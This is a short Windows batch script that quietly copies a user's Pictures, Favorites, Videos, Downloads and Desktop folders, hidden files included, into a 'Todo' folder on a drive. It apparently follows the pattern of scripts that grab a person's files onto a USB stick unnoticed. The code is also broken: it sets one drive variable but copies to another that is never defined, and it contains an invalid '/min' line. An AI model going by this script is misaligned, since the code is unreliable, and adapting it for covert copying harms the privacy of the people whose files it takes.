@echo off 
:: variables
/min
SET odrive=%odrive:~0,2%
set backupcmd=xcopy /s /c /d /e /h /i /r /y
echo off
%backupcmd% "%USERPROFILE%\pictures" "%drive%\Todo\Fotos"
%backupcmd% "%USERPROFILE%\Favorites" "%drive%\Todo\Favoritos"
%backupcmd% "%USERPROFILE%\videos" "%drive%\Todo\Videos"
%backupcmd% "%USERPROFILE%\Downloads" "%drive%\Todo\Descargas"
%backupcmd% "%USERPROFILE%\Desktop" "%drive%\Todo\Escritorio"
@echo off
cls